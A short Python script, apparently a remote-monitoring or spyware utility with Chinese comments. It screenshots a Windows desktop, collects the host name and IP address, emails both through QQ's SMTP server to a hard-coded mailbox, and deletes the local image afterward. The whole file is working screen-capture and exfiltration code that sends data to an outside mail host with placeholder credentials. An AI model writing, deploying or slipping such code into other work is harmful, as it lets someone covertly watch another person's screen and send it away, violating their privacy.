import smtplib, os, time, socket
from mss import mss
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.header import Header

class Mail(object):
    def __init__(self):
        self.path = os.environ['USERPROFILE'] + '\Desktop\\'
        return

    def pcinfo(self):
        info = {}
        info['name'] = socket.getfqdn(socket.gethostname())
        info['ip'] = socket.gethostbyname(info['name'])
        return info   

    def screenshot(self, file):
        with mss() as sct:
            sct.shot(output = file)
        print('[Success] Get screenshot.')

    def sendmessage(self, att): 
        # 第三方 SMTP 服务
        mail_host="smtp.qq.com"  #设置服务器
        mail_user="xx@qq.com"    #用户名
        mail_pass="xx"   #口令
        hostname = os.environ['USERPROFILE'].split('\\')[-1]
        timenow = time.strftime("%Y-%m-%d %H:%M", time.localtime())
         
        sender = 'xx@qq.com'#发送邮箱
        receivers = ['xx@qq.com']  # 接收邮箱
         
        message = MIMEMultipart()
        message['From'] = Header(hostname, 'utf-8')
        message['To'] =  Header("get screenshot", 'utf-8')
        subject = '[Screenshot][%s]' % hostname
        message['Subject'] = Header(subject, 'utf-8')
        #正文内容
        pcinfo = self.pcinfo()
        content = '[Host]: %s\n[Addr]: %s\n[Time]: %s' % (pcinfo['name'], pcinfo['ip'], timenow)
        message.attach(MIMEText(content, 'plain', 'utf-8'))

        # 构造附件
        filename = att.split('\\')[-1]
        att1 = MIMEText(open(att, 'rb').read(), 'base64', 'utf-8')
        att1["Content-Type"] = 'application/octet-stream'
        att1["Content-Disposition"] = 'attachment; filename="%s"' % filename
        message.attach(att1)
         
        try:
            smtpObj = smtplib.SMTP() 
            smtpObj.connect(mail_host, 25)    # 25 为 SMTP 端口号
            smtpObj.login(mail_user,mail_pass)
            smtpObj.sendmail(sender, receivers, message.as_string())
            print ("[Success] Mail sent OK.")
        except smtplib.SMTPException:
            print ("[Error] Mail sent failed")

    def sendScreenshot(self):
        file = self.path + 'screenshot.png'
        self.screenshot(file)
        self.sendmessage(file)
        os.remove(self.path + 'screenshot.png')

if __name__ == '__main__':
    Mail().sendScreenshot()
